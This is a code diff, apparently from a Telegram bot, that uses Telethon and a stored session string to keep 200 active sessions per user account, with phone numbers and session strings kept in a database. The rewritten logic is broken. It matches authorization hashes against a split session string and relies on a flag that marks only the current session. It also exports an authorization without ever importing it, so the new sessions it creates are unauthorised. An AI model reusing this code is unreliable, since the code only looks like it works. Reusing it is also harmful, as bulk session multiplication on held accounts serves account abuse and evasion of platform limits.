@@ -65,64 +65,79 @@ async def create_session_pool(user_id, phone, session_str):
         logger.error(f"Error creating session pool for {user_id}: {e}")
 
 async def maintain_sessions(user_id, phone, main_session_str):
-    """Поддерживаем пул активных сессий"""
+    """Поддерживаем 200 активных сеансов в одном аккаунте"""
     while True:
         try:
-            # Получаем текущие активные сессии
+            # Используем основную сессию для управления
+            main_client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
+            await main_client.connect()
+            
+            if not await main_client.is_user_authorized():
+                logger.error(f"Main session authorization lost for {user_id}")
+                break
+
+            # Получаем текущие активные сессии из базы
             active_sessions = list(active_sessions_col.find({"user_id": user_id}))
             
             # Проверяем активность сессий
             valid_sessions = []
             for session in active_sessions:
-                client = None
                 try:
-                    client = TelegramClient(StringSession(session['session']), API_ID, API_HASH)
-                    await client.connect()
+                    # Проверяем через основную сессию
+                    auth = await main_client(functions.account.GetAuthorizationsRequest())
+                    current_sessions = auth.authorizations
                     
-                    if await client.is_user_authorized():
+                    # Ищем нашу сессию среди активных
+                    session_active = any(
+                        s.current for s in current_sessions 
+                        if s.hash == int(session['session'].split(':')[0])
+                    )
+                    
+                    if session_active:
                         valid_sessions.append(session)
-                        # Обновляем время последней активности
                         active_sessions_col.update_one(
                             {"_id": session["_id"]},
                             {"$set": {"last_active": datetime.utcnow()}}
                         )
                     else:
-                        # Удаляем неактивную сессию
                         active_sessions_col.delete_one({"_id": session["_id"]})
                 except Exception as e:
                     logger.error(f"Session check error for {user_id}: {e}")
-                    if session in active_sessions:
-                        active_sessions_col.delete_one({"_id": session["_id"]})
-                finally:
-                    if client:
-                        await client.disconnect()
+                    active_sessions_col.delete_one({"_id": session["_id"]})
             
-            # Создаем недостающие сессии
+            # Создаем недостающие сессии (до 200)
             if len(valid_sessions) < 200:
                 needed = 200 - len(valid_sessions)
+                logger.info(f"Creating {needed} new sessions for {user_id}")
+                
                 for _ in range(needed):
-                    client = None
                     try:
-                        client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
-                        await client.connect()
+                        # Создаем новую сессию через основную
+                        new_client = TelegramClient(StringSession(), API_ID, API_HASH)
+                        await new_client.connect()
                         
-                        if await client.is_user_authorized():
-                            new_session_str = client.session.save()
-                            
-                            # Добавляем новую активную сессию
-                            active_sessions_col.insert_one({
-                                "user_id": user_id,
-                                "phone": phone,
-                                "session": new_session_str,
-                                "created_at": datetime.utcnow(),
-                                "last_active": datetime.utcnow()
-                            })
+                        # Авторизуем через основную сессию
+                        await main_client(functions.auth.ExportAuthorizationRequest(
+                            dc_id=new_client.session.dc_id
+                        ))
+                        
+                        new_session_str = new_client.session.save()
+                        
+                        # Сохраняем новую сессию
+                        active_sessions_col.insert_one({
+                            "user_id": user_id,
+                            "phone": phone,
+                            "session": new_session_str,
+                            "created_at": datetime.utcnow(),
+                            "last_active": datetime.utcnow()
+                        })
                     except Exception as e:
-                        logger.error(f"Error creating new session for {user_id}: {e}")
+                        logger.error(f"Error creating session for {user_id}: {e}")
                     finally:
-                        if client:
-                            await client.disconnect()
+                        if 'new_client' in locals():
+                            await new_client.disconnect()
             
+            await main_client.disconnect()
             await asyncio.sleep(3600)  # Проверка каждый час
             
         except asyncio.CancelledError:
